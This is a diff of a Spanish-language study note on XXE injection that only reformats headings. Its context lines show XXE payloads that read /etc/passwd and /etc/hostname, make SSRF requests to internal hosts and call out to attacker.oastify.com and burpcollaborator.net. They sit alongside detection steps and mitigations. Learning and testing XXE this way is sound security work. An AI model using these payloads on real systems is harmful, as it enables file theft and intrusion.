@@ -1,10 +1,6 @@
----
-icon: folder-open
----
-
 # XML external entity (XXE) injection
 
-### 🔍 ¿Qué es XXE?
+## 🔍 ¿Qué es XXE?
 
 **XML External Entity (XXE)** es una vulnerabilidad que ocurre cuando un parser XML procesa entidades externas sin validación adecuada.
 
@@ -20,9 +16,9 @@ El problema existe porque XML permite definir entidades externas (archivos, URLs
 
 ***
 
-### 🧱 Entidades XML
+## 🧱 Entidades XML
 
-#### 🔗 Entidades internas
+### Entidades internas
 
 ```xml
 <!DOCTYPE foo [
@@ -37,7 +33,7 @@ El problema existe porque XML permite definir entidades externas (archivos, URLs
 <message>Hello World</message>
 ```
 
-#### 🌐 Entidades externas
+### Entidades externas
 
 ```xml
 <!DOCTYPE foo [
@@ -48,7 +44,7 @@ El problema existe porque XML permite definir entidades externas (archivos, URLs
 
 Resultado: contenido de `/etc/passwd`
 
-#### ⚙️ Entidades de parámetro
+### Entidades de parámetro
 
 ```xml
 <!DOCTYPE foo [
@@ -61,49 +57,49 @@ Carga y ejecuta una DTD externa.
 
 ***
 
-### ⚔️ Tipos de ataques XXE
+## ⚔️ Tipos de ataques XXE
 
-#### 📡 XXE clásico (In-Band)
+### XXE clásico (In-Band)
 
 * La entidad se resuelve directamente
 * El resultado aparece en la respuesta
 * Permite lectura directa de archivos
 
-#### 🌫️ Blind XXE (Out-of-Band)
+### Blind XXE (Out-of-Band)
 
 * No hay respuesta directa
 * Se usan canales externos (DNS, HTTP)
 * Exfiltración indirecta
 
-#### ❌ XXE basado en errores
+### XXE basado en errores
 
 * Se provocan errores XML
 * El mensaje incluye datos del archivo
 
-#### 🧩 Blind XXE con entidades de parámetro
+### Blind XXE con entidades de parámetro
 
 * Las entidades normales están bloqueadas
 * Las de tipo `%` siguen funcionando
 
 ***
 
-### 🛤️ Vectores comunes
+## 🛤️ Vectores comunes
 
-#### 📂 Lectura de archivos
+### Lectura de archivos
 
 ```xml
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
 
-#### 🌐 SSRF
+### SSRF
 
 ```xml
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
 <data>&xxe;</data>
 ```
 
-#### 📤 Exfiltración out-of-band
+### Exfiltración out-of-band
 
 DTD maliciosa:
 
@@ -114,7 +110,7 @@ DTD maliciosa:
 %exfil;
 ```
 
-#### 🚨 Exfiltración por error
+### Exfiltración por error
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -123,7 +119,7 @@ DTD maliciosa:
 %error;
 ```
 
-#### 🔗 XInclude
+### XInclude
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
@@ -131,7 +127,7 @@ DTD maliciosa:
 </foo>
 ```
 
-#### 📁 Subida de SVG
+### Subida de SVG
 
 ```xml
 <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
@@ -142,16 +138,16 @@ DTD maliciosa:
 
 ***
 
-### 🕵️ Técnicas Blind XXE
+## 🕵️ Técnicas Blind XXE
 
-#### 🌍 Detección vía DNS
+### Detección vía DNS
 
 ```xml
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.oastify.com">]>
 <data>&xxe;</data>
 ```
 
-#### ⚙️ Entidades de parámetro
+### Entidades de parámetro
 
 ```xml
 <!DOCTYPE foo [
@@ -160,7 +156,7 @@ DTD maliciosa:
 ]>
 ```
 
-#### 📤 Exfiltración OOB
+### Exfiltración OOB
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
@@ -169,7 +165,7 @@ DTD maliciosa:
 %exfil;
 ```
 
-#### 🚨 Exfiltración por error
+### Exfiltración por error
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -180,9 +176,9 @@ DTD maliciosa:
 
 ***
 
-### 🚀 Explotación avanzada
+## 🚀 Explotación avanzada
 
-#### 🏴‍☠️ Secuestro de DTD local
+### Secuestro de DTD local
 
 ```xml
 <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
@@ -190,7 +186,7 @@ DTD maliciosa:
 
 Permite reutilizar DTDs locales para evadir restricciones.
 
-#### 💥 Ataque Billion Laughs (DoS)
+### Ataque Billion Laughs (DoS)
 
 ```xml
 <!ENTITY lol "lol">
@@ -199,7 +195,7 @@ Permite reutilizar DTDs locales para evadir restricciones.
 
 Genera expansión exponencial y consume memoria.
 
-#### 📬 XXE en SOAP
+### XXE en SOAP
 
 ```xml
 <soap:Body>
@@ -208,13 +204,13 @@ Genera expansión exponencial y consume memoria.
 </soap:Body>
 ```
 
-#### 📄 XXE en documentos Office
+### XXE en documentos Office
 
 Archivos `.docx` / `.xlsx` contienen XML interno vulnerable.
 
 ***
 
-### 🎯 Endpoints vulnerables comunes
+## 🎯 Endpoints vulnerables comunes
 
 * Subidas de XML
 * Import/export de configuraciones
@@ -225,7 +221,7 @@ Archivos `.docx` / `.xlsx` contienen XML interno vulnerable.
 
 ***
 
-### 💥 Impacto real
+## 💥 Impacto real
 
 * Acceso a archivos internos
 * SSRF a servicios internos
@@ -235,9 +231,9 @@ Archivos `.docx` / `.xlsx` contienen XML interno vulnerable.
 
 ***
 
-### 🔎 Métodos de detección
+## 🔎 Métodos de detección
 
-#### ✍️ Manual
+### Manual
 
 ```xml
 <!DOCTYPE foo [<!ENTITY test "INJECTED">]>
@@ -246,21 +242,21 @@ Archivos `.docx` / `.xlsx` contienen XML interno vulnerable.
 
 Si aparece "INJECTED" → vulnerable.
 
-#### 📂 Lectura de archivo
+### Lectura de archivo
 
 ```xml
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <data>&xxe;</data>
 ```
 
-#### 🌐 Out-of-band
+### Out-of-band
 
 ```xml
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burpcollaborator.net">]>
 <data>&xxe;</data>
 ```
 
-#### 🤖 Automatizado
+### Automatizado
 
 * Burp Suite
 * OWASP ZAP
@@ -269,9 +265,9 @@ Si aparece "INJECTED" → vulnerable.
 
 ***
 
-### 🛡️ Mitigación
+## 🛡️ Mitigación
 
-#### 🚫 Deshabilitar entidades externas
+### Deshabilitar entidades externas
 
 Ejemplo en Java:
 
@@ -279,30 +275,30 @@ Ejemplo en Java:
 dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 ```
 
-#### ✅ Validación de entrada
+### Validación de entrada
 
 ```python
 if b'<!DOCTYPE' in xml_data:
     raise ValueError("DTD no permitido")
 ```
 
-#### 🧰 Usar parsers seguros
+### Usar parsers seguros
 
 * defusedxml (Python)
 * Configuración segura en Java
 
-#### 🔄 Alternativas
+### Alternativas
 
 * Usar JSON en lugar de XML
 
-#### 🔒 Principio de mínimo privilegio
+### Principio de mínimo privilegio
 
 * Limitar acceso al sistema de archivos
 * Aislar el parser
 
 ***
 
-### 📋 Metodología de testeo
+## 📋 Metodología de testeo
 
 1. Identificar entradas XML
 2. Probar entidades básicas
